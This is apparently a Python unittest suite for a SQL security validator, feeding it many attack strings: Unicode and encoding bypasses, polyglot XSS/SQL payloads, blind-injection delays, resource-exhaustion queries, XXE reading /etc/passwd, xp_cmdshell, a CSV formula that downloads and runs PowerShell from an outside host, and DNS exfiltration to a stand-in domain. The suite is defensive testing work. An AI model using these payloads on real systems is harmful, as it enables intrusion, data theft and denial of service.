#!/usr/bin/env python3
"""
Edge Cases and Attack Pattern Tests

This test suite covers edge cases and advanced attack patterns that might bypass basic security:
- Unicode and encoding attacks
- Polyglot attacks (multiple language injection)
- Time-based blind attacks
- Second-order attacks
- Logic bomb patterns  
- Advanced obfuscation techniques
- Race condition exploits
- Memory exhaustion attacks
- Cryptographic attacks
- Protocol-specific attacks
"""

import unittest
import re
import time
import threading
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict

# Import the function we want to test
from app import validate_sql_security


class TestUnicodeEncodingAttacks(unittest.TestCase):
    """Test Unicode and encoding-based attack patterns"""
    
    def setUp(self):
        """Set up Unicode attack test cases"""
        self.unicode_attacks = [
            # Unicode normalization attacks
            ("SELECT * FROM users WHERE name = 'admin\u0301'", "Unicode normalization bypass"),
            ("SELECT * FROM users WHERE id = 1 \u2028 OR 1=1", "Unicode line separator"),
            ("SELECT * FROM users WHERE id = 1 \u2029 OR 1=1", "Unicode paragraph separator"),
            
            # Homograph attacks (lookalike characters)
            ("SELECT * FROM users WHERE name = 'αdmin'", "Greek alpha instead of 'a'"),
            ("SELECT * FROM users WHERE name = 'аdmin'", "Cyrillic 'a' instead of Latin 'a'"),
            ("SELECT * FROM users WHERE name = 'admin\u200b'", "Zero-width space"),
            ("SELECT * FROM users WHERE name = 'admin\ufeff'", "Byte order mark"),
            
            # Unicode escapes in SQL
            ("SELECT * FROM users WHERE name = '\u0061\u0064\u006d\u0069\u006e'", "Unicode escape for 'admin'"),
            ("SELECT * FROM users WHERE id = 1 \u006f\u0072 1=1", "Unicode 'or' keyword"),
            
            # Mixed encoding attacks
            ("SELECT * FROM users WHERE name = 'admin' %41%44%4d%49%4e", "Mixed Unicode and URL encoding"),
            ("SELECT \u002a FROM users \u0057HERE id = 1", "Unicode SQL keywords"),
            
            # Right-to-left override attacks
            ("SELECT * FROM users WHERE name = 'admin\u202e'", "Right-to-left override"),
            ("SELECT * FROM \u202eresU\u202c WHERE id = 1", "RTL override table name"),
            
            # Invisible characters
            ("SELECT\u00a0*\u00a0FROM\u00a0users", "Non-breaking spaces"),
            ("SELECT\u200b*\u200bFROM\u200busers", "Zero-width spaces"),
            ("SELECT\u2060*\u2060FROM\u2060users", "Word joiner characters"),
            
            # UTF-8 overlong encoding
            ("SELECT * FROM users WHERE name = '\xc0\xafadmin'", "UTF-8 overlong encoding"),
            ("SELECT * FROM users WHERE id = 1 \xc0\xafOR 1=1", "Overlong encoded OR"),
            
            # Unicode control characters
            ("SELECT * FROM users\x0c WHERE id = 1", "Form feed character"),
            ("SELECT * FROM users\x0b WHERE id = 1", "Vertical tab character"),
            ("SELECT * FROM users\x85 WHERE id = 1", "Next line character"),
        ]
        
        self.encoding_attacks = [
            # Double encoding
            ("SELECT * FROM users WHERE id = %2531%2520OR%25201%253D1", "Double URL encoding"),
            ("SELECT * FROM users WHERE name = %2527admin%2527", "Double encoded quotes"),
            
            # Base64 encoding attacks
            (f"SELECT * FROM users WHERE id = '{base64.b64encode(b'1 OR 1=1').decode()}'", "Base64 encoded injection"),
            
            # Hex encoding
            ("SELECT * FROM users WHERE name = 0x61646d696e", "Hex encoded 'admin'"),
            ("SELECT UNHEX('53454c454354202a2046524f4d207573657273')", "Unhex SQL injection"),
            
            # HTML entity encoding
            ("SELECT * FROM users WHERE name = '&lt;script&gt;alert(1)&lt;/script&gt;'", "HTML entities"),
            ("SELECT * FROM users WHERE id = 1 &#79;&#82; 1=1", "HTML entity OR"),
        ]
    
    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization bypass attempts"""
        for attack_query, description in self.unicode_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Unicode attacks should be detected
                total_issues = len(result['errors']) + len(result['warnings'])
                self.assertGreater(total_issues, 0,
                    f"Unicode attack not detected: {description}")
                
                # Many Unicode attacks should trigger encoding warnings
                if result['warnings']:
                    encoding_warning = any(
                        'ascii' in warning.lower() or 'encoding' in warning.lower()
                        for warning in result['warnings']
                    )
                    # Some Unicode attacks should trigger encoding warnings
                    if not encoding_warning and any(char in attack_query for char in ['\u0301', '\u2028', '\u200b']):
                        self.assertTrue(encoding_warning,
                            f"Unicode attack should trigger encoding warning: {description}")
    
    def test_encoding_bypass_attempts(self):
        """Test encoding-based bypass attempts"""
        for attack_query, description in self.encoding_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Encoding attacks should generally be detected
                # Some might pass basic validation but should be caught by application-level validation
                if 'OR' in attack_query.upper() or 'SELECT' in attack_query.upper():
                    total_issues = len(result['errors']) + len(result['warnings'])
                    self.assertGreater(total_issues, 0,
                        f"Encoding attack not detected: {description}")


class TestPolyglotAttacks(unittest.TestCase):
    """Test polyglot attacks that work across multiple contexts"""
    
    def setUp(self):
        """Set up polyglot attack patterns"""
        self.polyglot_attacks = [
            # SQL + JavaScript polyglots
            ("javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'", "SQL+JS+HTML polyglot"),
            ("';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//", "SQL+JS polyglot"),
            
            # SQL + Command injection polyglots  
            ("'; echo 'SQL injection'; #", "SQL+shell polyglot"),
            ("1; SELECT * FROM users; echo 'command injection'", "SQL+command polyglot"),
            
            # SQL + LDAP polyglots
            ("admin')(&(password=*))", "SQL+LDAP polyglot"),
            ("'; (|(uid=*))", "SQL+LDAP polyglot"),
            
            # SQL + XML polyglots
            ("'; <?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", "SQL+XML polyglot"),
            ("1' UNION SELECT '<?xml version=\"1.0\"?><root>test</root>'", "SQL with XML content"),
            
            # SQL + NoSQL polyglots
            ("admin'; return true; var x='", "SQL+NoSQL polyglot"),
            ("'; {$ne: null}", "SQL+MongoDB polyglot"),
            
            # Multi-context polyglots
            ("';alert(1);var a='/*';DROP TABLE users;#", "SQL+JS+SQL polyglot"),
            ("\"; system('whoami'); #", "SQL+command+comment polyglot"),
            
            # Template injection polyglots
            ("'; {{7*7}}; #", "SQL+template injection"),
            ("1'; ${7*7}; #", "SQL+template injection"),
            
            # Format string + SQL polyglots
            ("'; %x%x%x%x; #", "SQL+format string"),
            ("1' AND '%s'='%s", "SQL+format string"),
        ]
    
    def test_polyglot_attack_detection(self):
        """Test detection of polyglot attacks"""
        for attack_query, description in self.polyglot_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Polyglot attacks should be detected by multiple patterns
                self.assertFalse(result['valid'],
                    f"Polyglot attack not blocked: {description}")
                
                # Should have high or critical severity
                self.assertIn(result['severity'], ['high', 'critical'],
                    f"Polyglot attack severity too low: {description}")
                
                # Should detect multiple issues
                total_issues = len(result['errors']) + len(result['warnings'])
                self.assertGreater(total_issues, 0,
                    f"Polyglot attack should trigger multiple detections: {description}")


class TestAdvancedObfuscation(unittest.TestCase):
    """Test advanced obfuscation techniques"""
    
    def setUp(self):
        """Set up advanced obfuscation test cases"""
        self.obfuscation_attacks = [
            # Case variation obfuscation
            ("SeLeCt * FrOm UsErS wHeRe Id = 1 oR 1=1", "Case variation"),
            ("sElEcT * fRoM uSeRs WhErE iD = 1 UnIoN sElEcT pAsSwOrD fRoM aDmIn", "Mixed case union"),
            
            # Comment-based obfuscation
            ("SELECT/**//**/FROM/**/users/**/WHERE/**/id=1/**/OR/**/1=1", "Comment whitespace"),
            ("SELECT/*!*/FROM/*!*/users/*!*/WHERE/*!*/id=1/*!*/OR/*!*/1=1", "MySQL comment hints"),
            ("SELECT --comment\nFROM --comment\nusers --comment\nWHERE id=1 OR 1=1", "Line comment obfuscation"),
            
            # Whitespace obfuscation
            ("SELECT\t*\nFROM\r\nusers\tWHERE\nid=1\tOR\t1=1", "Mixed whitespace"),
            ("SELECT\x0b*\x0cFROM\x85users\xa0WHERE id=1 OR 1=1", "Exotic whitespace"),
            ("SELECT\u00a0*\u2000FROM\u2001users\u2002WHERE\u2003id=1\u2004OR\u20051=1", "Unicode spaces"),
            
            # Function-based obfuscation
            ("SELECT * FROM users WHERE CONCAT('ad','min') = username", "String function obfuscation"),
            ("SELECT * FROM users WHERE SUBSTRING(username,1,5) = 'admin'", "Substring obfuscation"),
            ("SELECT * FROM users WHERE LENGTH(username) = 5 AND username LIKE 'admin'", "Length-based obfuscation"),
            
            # Mathematical obfuscation
            ("SELECT * FROM users WHERE id = (1*1) OR (2-1)=(2-1)", "Mathematical expressions"),
            ("SELECT * FROM users WHERE id = POWER(1,1) OR SQRT(1)=SQRT(1)", "Mathematical functions"),
            ("SELECT * FROM users WHERE id = ABS(-1) OR SIGN(1)=SIGN(1)", "Mathematical operations"),
            
            # Character encoding obfuscation
            ("SELECT CHAR(83,69,76,69,67,84,32,42,32,70,82,79,77,32,117,115,101,114,115)", "CHAR function"),
            ("SELECT ASCII('A'), CHAR(65)", "ASCII/CHAR conversion"),
            ("SELECT UNHEX(HEX('SELECT * FROM users'))", "HEX/UNHEX obfuscation"),
            
            # Conditional obfuscation
            ("SELECT * FROM users WHERE CASE WHEN 1=1 THEN 1 ELSE 0 END = 1", "CASE statement"),
            ("SELECT * FROM users WHERE IF(1=1,1,0) = 1", "IF statement"),
            ("SELECT * FROM users WHERE NULLIF(1,2) IS NOT NULL", "NULLIF obfuscation"),
            
            # Nested query obfuscation
            ("SELECT * FROM (SELECT * FROM users) AS u WHERE u.id = 1 OR 1=1", "Nested query"),
            ("SELECT * FROM users WHERE id IN (SELECT 1 WHERE 1=1)", "Subquery obfuscation"),
            ("SELECT * FROM users WHERE EXISTS(SELECT 1 WHERE 1=1)", "EXISTS subquery"),
            
            # Union obfuscation
            ("SELECT id FROM users WHERE 1=0 UNION ALL SELECT password FROM admin WHERE 1=1", "UNION ALL"),
            ("SELECT null,null,password,null FROM admin UNION SELECT id,name,email,phone FROM users", "NULL padding"),
            ("(SELECT * FROM users) UNION (SELECT * FROM admin)", "Parenthesized UNION"),
        ]
    
    def test_advanced_obfuscation_detection(self):
        """Test detection of advanced obfuscation techniques"""
        for attack_query, description in self.obfuscation_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Most obfuscation attempts should be detected
                if any(keyword in attack_query.upper() for keyword in ['UNION', 'SELECT', 'DROP', 'OR 1=1']):
                    self.assertFalse(result['valid'],
                        f"Obfuscated attack not detected: {description}")
                    
                    self.assertIn(result['severity'], ['medium', 'high', 'critical'],
                        f"Obfuscated attack severity too low: {description}")
                
                # Some techniques might only generate warnings
                total_issues = len(result['errors']) + len(result['warnings'])
                if 'SELECT' in attack_query.upper():
                    self.assertGreater(total_issues, 0,
                        f"Obfuscated query should trigger some detection: {description}")


class TestTimeBasedAttacks(unittest.TestCase):
    """Test time-based and blind attack patterns"""
    
    def setUp(self):
        """Set up time-based attack patterns"""
        self.time_based_attacks = [
            # SQL Server time delays
            ("SELECT * FROM users WHERE id = 1; WAITFOR DELAY '00:00:05'", "SQL Server WAITFOR delay"),
            ("SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM sysobjects) > 0; WAITFOR DELAY '00:00:01'", "Conditional WAITFOR"),
            
            # MySQL time delays
            ("SELECT * FROM users WHERE id = 1 AND SLEEP(5)", "MySQL SLEEP function"),
            ("SELECT * FROM users WHERE id = 1 AND (SELECT SLEEP(1) FROM users LIMIT 1)", "MySQL subquery SLEEP"),
            ("SELECT BENCHMARK(1000000, SHA1('test'))", "MySQL BENCHMARK function"),
            
            # PostgreSQL time delays
            ("SELECT * FROM users WHERE id = 1; SELECT pg_sleep(5)", "PostgreSQL pg_sleep"),
            ("SELECT * FROM users WHERE id = 1 AND (SELECT pg_sleep(1)) IS NULL", "PostgreSQL conditional delay"),
            
            # Heavy computation delays
            ("SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) > 0", "Cartesian product delay"),
            ("SELECT * FROM users WHERE id = 1 AND (SELECT MAX(table_name) FROM information_schema.tables GROUP BY table_name) IS NOT NULL", "Complex aggregation delay"),
            
            # Recursive delays
            ("WITH RECURSIVE bomb(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM bomb WHERE x < 100000) SELECT COUNT(*) FROM bomb", "Recursive CTE bomb"),
            
            # Error-based time delays
            ("SELECT * FROM users WHERE id = 1 AND (SELECT IF(1=1,SLEEP(1),0))", "Error-based conditional delay"),
            ("SELECT * FROM users WHERE id = 1 AND (SELECT CASE WHEN 1=1 THEN pg_sleep(1) ELSE 0 END)", "CASE-based delay"),
        ]
    
    def test_time_based_attack_detection(self):
        """Test detection of time-based attack patterns"""
        for attack_query, description in self.time_based_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Time-based attacks should be blocked
                self.assertFalse(result['valid'],
                    f"Time-based attack not blocked: {description}")
                
                # Should have high or critical severity
                self.assertIn(result['severity'], ['high', 'critical'],
                    f"Time-based attack severity too low: {description}")
                
                # Should detect time-based patterns
                time_patterns = ['sleep', 'waitfor', 'delay', 'benchmark', 'pg_sleep']
                pattern_detected = any(
                    pattern in ' '.join(result['errors']).lower()
                    for pattern in time_patterns
                )
                
                # Note: Some patterns might not be explicitly detected but should still be blocked
                if any(pattern in attack_query.lower() for pattern in time_patterns):
                    total_issues = len(result['errors']) + len(result['warnings'])
                    self.assertGreater(total_issues, 0,
                        f"Time-based attack should be detected: {description}")


class TestLogicBombPatterns(unittest.TestCase):
    """Test logic bomb and denial-of-service patterns"""
    
    def setUp(self):
        """Set up logic bomb test patterns"""
        self.logic_bombs = [
            # Recursive bombs
            ("WITH RECURSIVE bomb(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM bomb) SELECT * FROM bomb", "Infinite recursion"),
            ("WITH RECURSIVE factorial(n, fact) AS (SELECT 0, 1 UNION ALL SELECT n+1, (n+1)*fact FROM factorial WHERE n < 100000) SELECT * FROM factorial", "Factorial explosion"),
            
            # Cartesian product bombs
            ("SELECT * FROM users A, users B, users C, users D WHERE A.id = B.id", "Cartesian product"),
            ("SELECT * FROM information_schema.tables A CROSS JOIN information_schema.tables B CROSS JOIN information_schema.tables C", "Schema cross join bomb"),
            
            # Memory exhaustion
            ("SELECT REPEAT('A', 100000000)", "Memory exhaustion via REPEAT"),
            ("SELECT GROUP_CONCAT(REPEAT('X', 1000) SEPARATOR '') FROM information_schema.tables", "GROUP_CONCAT bomb"),
            ("SELECT RPAD('A', 4294967295, 'B')", "RPAD memory bomb"),
            
            # CPU exhaustion
            ("SELECT SHA2(REPEAT('A', 1000000), 512)", "CPU-intensive hashing"),
            ("SELECT MD5(CONCAT(MD5(CONCAT(MD5('test'), 'salt')), 'more_salt'))", "Nested hashing"),
            
            # Regex bombs
            ("SELECT 'aaaaaaaaaaaaaaaaaaaaaa' REGEXP '^(a+)+$'", "Regex catastrophic backtracking"),
            ("SELECT 'aaaaaaaaaaaaaaaaaaX' REGEXP '^(a|a)*$'", "Regex exponential matching"),
            
            # File system bombs (if supported)
            ("SELECT LOAD_FILE(CONCAT('/dev/random')) LIMIT 1000000", "Random data loading"),
            ("SELECT 'data' INTO OUTFILE CONCAT('/tmp/bomb_', UUID(), '.txt')", "File creation bomb"),
        ]
    
    def test_logic_bomb_detection(self):
        """Test detection of logic bomb patterns"""
        for bomb_query, description in self.logic_bombs:
            with self.subTest(description=description, query=bomb_query[:50]):
                result = validate_sql_security(bomb_query)
                
                # Logic bombs should generally be blocked
                # Some might pass basic pattern matching but should be caught by resource limits
                dangerous_patterns = ['recursive', 'repeat', 'cross join', 'regexp', 'load_file']
                
                if any(pattern in bomb_query.lower() for pattern in dangerous_patterns):
                    # Should be detected or at least generate warnings
                    total_issues = len(result['errors']) + len(result['warnings'])
                    if not result['valid'] or total_issues > 0:
                        # Either blocked or flagged
                        if not result['valid']:
                            self.assertIn(result['severity'], ['medium', 'high', 'critical'],
                                f"Logic bomb severity too low: {description}")
                    else:
                        # Some sophisticated bombs might not be caught by basic patterns
                        # This is acceptable as they would be caught by resource limits
                        pass


class TestSecondOrderAttacks(unittest.TestCase):
    """Test second-order and stored attack patterns"""
    
    def setUp(self):
        """Set up second-order attack scenarios"""
        self.second_order_scenarios = [
            # Stored XSS in database fields that might be used in SQL
            {
                'stored_data': "<script>alert('xss')</script>",
                'query_template': "SELECT * FROM users WHERE name = '{}'",
                'description': 'Stored XSS in SQL context'
            },
            {
                'stored_data': "'; DROP TABLE users; --",
                'query_template': "INSERT INTO logs (message) VALUES ('{}')",
                'description': 'Stored SQL injection payload'
            },
            {
                'stored_data': "admin' OR 1=1 --",
                'query_template': "SELECT * FROM users WHERE username = '{}'",
                'description': 'Stored injection in username field'
            },
            {
                'stored_data': "1; EXEC xp_cmdshell 'whoami'",
                'query_template': "SELECT * FROM products WHERE id = {}",
                'description': 'Stored command injection in ID field'
            },
            {
                'stored_data': "UNION SELECT password FROM admin",
                'query_template': "SELECT description FROM products WHERE category = '{}'",
                'description': 'Stored union injection in category'
            }
        ]
    
    def test_second_order_attack_scenarios(self):
        """Test second-order attack pattern detection"""
        for scenario in self.second_order_scenarios:
            with self.subTest(description=scenario['description']):
                # Simulate the stored data being used in a query
                constructed_query = scenario['query_template'].format(scenario['stored_data'])
                
                # Validate the constructed query
                result = validate_sql_security(constructed_query)
                
                # Second-order attacks should be detected when the query is constructed
                self.assertFalse(result['valid'],
                    f"Second-order attack not detected: {scenario['description']}")
                
                # Should have appropriate severity
                self.assertIn(result['severity'], ['medium', 'high', 'critical'],
                    f"Second-order attack severity too low: {scenario['description']}")
                
                # Should detect the malicious patterns
                malicious_patterns = ['drop', 'union', 'xp_cmdshell', 'or 1=1', 'script']
                pattern_found = any(
                    pattern in ' '.join(result['errors']).lower()
                    for pattern in malicious_patterns
                )
                # At least some patterns should be detected
                total_issues = len(result['errors']) + len(result['warnings'])
                self.assertGreater(total_issues, 0,
                    f"Second-order attack should trigger detection: {scenario['description']}")


class TestRaceConditionExploits(unittest.TestCase):
    """Test race condition exploitation patterns"""
    
    def test_concurrent_validation_consistency(self):
        """Test that concurrent validation produces consistent results"""
        dangerous_query = "SELECT * FROM users WHERE id = 1 OR 1=1"
        safe_query = "SELECT id, name FROM customers WHERE active = 1"
        
        results = []
        
        def validate_query(query):
            result = validate_sql_security(query)
            results.append((query, result['valid'], result['severity']))
        
        # Run concurrent validations
        threads = []
        for _ in range(10):
            t1 = threading.Thread(target=validate_query, args=(dangerous_query,))
            t2 = threading.Thread(target=validate_query, args=(safe_query,))
            threads.extend([t1, t2])
        
        # Start all threads
        for thread in threads:
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Analyze results
        dangerous_results = [r for r in results if r[0] == dangerous_query]
        safe_results = [r for r in results if r[0] == safe_query]
        
        # All dangerous queries should be consistently blocked
        for query, valid, severity in dangerous_results:
            self.assertFalse(valid, "Dangerous query should always be blocked")
            self.assertIn(severity, ['high', 'critical'], "Dangerous query should have high severity")
        
        # All safe queries should be consistently allowed or have low severity
        for query, valid, severity in safe_results:
            if not valid:
                self.assertEqual(severity, 'low', "Safe query should only have low severity issues")
    
    def test_concurrent_resource_exhaustion(self):
        """Test behavior under concurrent resource exhaustion attempts"""
        # Queries designed to consume resources
        resource_intensive_queries = [
            "SELECT REPEAT('A', 100000)",
            "WITH RECURSIVE bomb(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM bomb WHERE x < 1000) SELECT COUNT(*) FROM bomb",
            "SELECT * FROM information_schema.tables A CROSS JOIN information_schema.tables B",
        ]
        
        results = []
        
        def validate_intensive_query(query):
            try:
                result = validate_sql_security(query)
                results.append(('success', result['valid'], result['severity']))
            except Exception as e:
                results.append(('error', str(e), None))
        
        # Run concurrent resource-intensive validations
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for query in resource_intensive_queries:
                for _ in range(3):  # Multiple instances of each query
                    future = executor.submit(validate_intensive_query, query)
                    futures.append(future)
            
            # Wait for completion
            for future in futures:
                future.result(timeout=30)  # 30 second timeout
        
        # All validations should complete (no hangs)
        self.assertEqual(len(results), len(resource_intensive_queries) * 3)
        
        # Most should be blocked or error gracefully
        blocked_or_error = sum(1 for r in results if r[0] == 'error' or not r[1])
        self.assertGreater(blocked_or_error, 0, "Resource intensive queries should be blocked or error")


class TestCryptographicAttacks(unittest.TestCase):
    """Test cryptographic and hash-based attack patterns"""
    
    def setUp(self):
        """Set up cryptographic attack patterns"""
        self.crypto_attacks = [
            # Hash collision attempts
            ("SELECT * FROM users WHERE MD5(password) = MD5('collision_attempt')", "MD5 collision"),
            ("SELECT * FROM users WHERE SHA1(username) = SHA1('chosen_plaintext')", "SHA1 collision attempt"),
            
            # Rainbow table attacks
            ("SELECT * FROM users WHERE password = 'e99a18c428cb38d5f260853678922e03'", "MD5 rainbow table lookup"),
            ("SELECT * FROM users WHERE password_hash = 'adc83b19e793491b1c6ea0fd8b46cd9f32e592fc'", "SHA1 rainbow table"),
            
            # Timing attack patterns
            ("SELECT * FROM users WHERE username = 'admin' AND BENCHMARK(1000000, SHA1(password)) IS NOT NULL", "Timing attack via benchmark"),
            ("SELECT * FROM users WHERE password = 'test' AND SLEEP(LENGTH(password)/1000)", "Length-based timing"),
            
            # Weak cryptographic functions
            ("SELECT * FROM users WHERE password = ENCRYPT('password', 'salt')", "Weak encryption function"),
            ("SELECT * FROM users WHERE hash = OLD_PASSWORD('password')", "Deprecated hash function"),
            
            # Key exposure attempts
            ("SELECT * FROM crypto_keys WHERE key_type = 'private'", "Private key exposure"),
            ("SELECT HEX(RANDOM_BYTES(32)) AS secret_key", "Key generation exposure"),
        ]
    
    def test_cryptographic_attack_detection(self):
        """Test detection of cryptographic attacks"""
        for attack_query, description in self.crypto_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Some crypto attacks might not be caught by basic SQL validation
                # But dangerous patterns should still be detected
                if 'benchmark' in attack_query.lower() or 'sleep' in attack_query.lower():
                    self.assertFalse(result['valid'],
                        f"Timing-based crypto attack should be blocked: {description}")
                
                # Crypto-related queries should at least generate warnings
                crypto_patterns = ['md5', 'sha1', 'password', 'hash', 'encrypt', 'key']
                if any(pattern in attack_query.lower() for pattern in crypto_patterns):
                    total_issues = len(result['errors']) + len(result['warnings'])
                    # Some crypto operations might be legitimate, so we just check for awareness
                    # In a production system, these would need context-aware validation


class TestProtocolSpecificAttacks(unittest.TestCase):
    """Test protocol-specific attack patterns"""
    
    def setUp(self):
        """Set up protocol-specific attacks"""
        self.protocol_attacks = [
            # HTTP header injection (via database)
            ("SELECT * FROM users WHERE name = 'admin\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert(1)</script>'", "HTTP header injection"),
            
            # SMTP injection
            ("INSERT INTO emails (recipient) VALUES ('victim@example.com\\r\\nBcc: attacker@evil.com')", "SMTP header injection"),
            
            # LDAP injection
            ("SELECT * FROM users WHERE username = 'admin')(&(password=*))'", "LDAP injection"),
            ("SELECT * FROM users WHERE filter = '(|(uid=admin)(uid=root))'", "LDAP filter injection"),
            
            # XML injection
            ("INSERT INTO xml_data VALUES ('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>')", "XXE injection"),
            
            # JSON injection
            ("UPDATE config SET data = '{\"admin\": true, \"role\": \"superuser\"}'", "JSON structure injection"),
            
            # CSV injection
            ("INSERT INTO export_data VALUES ('=cmd|\\'/c powershell IEX(wget 0r.pe/p)\\'')", "CSV formula injection"),
            
            # DNS exfiltration patterns
            ("SELECT CONCAT(password, '.evil-dns-server.com') FROM users WHERE username = 'admin'", "DNS exfiltration attempt"),
        ]
    
    def test_protocol_specific_attacks(self):
        """Test detection of protocol-specific attacks"""
        for attack_query, description in self.protocol_attacks:
            with self.subTest(description=description, query=attack_query[:50]):
                result = validate_sql_security(attack_query)
                
                # Protocol attacks should generally trigger some form of detection
                total_issues = len(result['errors']) + len(result['warnings'])
                
                # Look for dangerous patterns
                dangerous_patterns = ['script', 'system', 'file:///', '<!entity', '=cmd']
                pattern_detected = any(
                    pattern.lower() in attack_query.lower()
                    for pattern in dangerous_patterns
                )
                
                if pattern_detected:
                    # Should be blocked or at least flagged
                    self.assertGreater(total_issues, 0,
                        f"Protocol attack should be detected: {description}")
                
                # Some protocol attacks might be subtle and require context awareness
                # The important thing is that they don't crash the validator


if __name__ == '__main__':
    # Run edge case and attack pattern tests
    unittest.main(verbosity=2)